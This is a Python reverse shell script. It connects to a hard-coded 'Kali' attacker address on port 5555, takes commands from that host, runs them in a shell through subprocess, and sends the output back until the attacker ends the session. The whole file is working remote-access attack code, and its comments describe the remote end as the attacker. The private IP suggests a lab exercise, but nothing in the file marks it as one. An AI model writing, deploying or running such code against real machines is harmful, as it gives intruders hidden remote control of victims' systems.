import socket
import subprocess
import os

# Kali Ip address
kali_ip = "192.168.126.129" 

# Create a socket object 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Start connection
s.connect((kali_ip, 5555))

# Notify the attacker of a successful 
s.send("\nConnected!\n".encode())

# Set up current path
path = os.getcwd()


# loop until the attacker sends the termination symbol '&'
while True:

	# Display current path to Kali
	s.send((path + " >> ").encode())

	# Receive command from the attacker
	received_data = s.recv(1024).decode().rstrip()

	if (received_data.strip() == "&"):
		# End connection
		break
	elif (received_data.split()[0] == "cd"):
		# Handle change directory command
		try:
			new_path = received_data.split()[1].encode()
			os.chdir(new_path)
			# Update path variable if chdir successful.
			path = os.getcwd()
				
		except FileNotFoundError:
			output = s.send("\n The specified directory does not exist \n".encode())
	else:
		# Handle non-interactive commands and capture errors if raised
		try:
			output = subprocess.check_output(received_data, shell=True, stderr=subprocess.STDOUT)
		except subprocess.CalledProcessError as e:
			output = e.output

	# Send the command output back to the attacker
	s.send(output)

s.send("Connection End Here.\n".encode())
s.close()
